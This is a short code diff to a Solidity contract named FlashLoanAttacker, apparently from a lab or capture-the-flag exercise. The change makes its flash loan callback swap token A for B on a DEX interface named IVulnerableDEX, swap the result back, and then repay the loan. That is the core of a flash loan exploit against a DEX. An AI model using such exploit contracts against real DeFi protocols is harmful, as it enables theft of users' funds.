@@ -51,18 +51,18 @@ contract FlashLoanAttacker {
     }
 
     function executeOnFlashLoan(uint256 amount) external {
-    require(msg.sender == address(flashLoanProvider), "bad caller");
+        require(msg.sender == address(flashLoanProvider), "bad caller");
 
         tokenA.approve(dex, type(uint256).max);
         tokenB.approve(dex, type(uint256).max);
 
-        IVulnerableDEX(dex).swapAForB(amount);
+        uint256 bOut = IVulnerableDEX(dex).swapAForB(amount);
 
-        require(
-            tokenA.transfer(address(flashLoanProvider), amount),
-            "repay failed"
-        );
+        IVulnerableDEX(dex).swapBForA(bOut);
+
+        require(tokenA.transfer(address(flashLoanProvider), amount), "repay failed");
     }
+
 
     function withdraw() external {
         require(msg.sender == owner, "not owner");
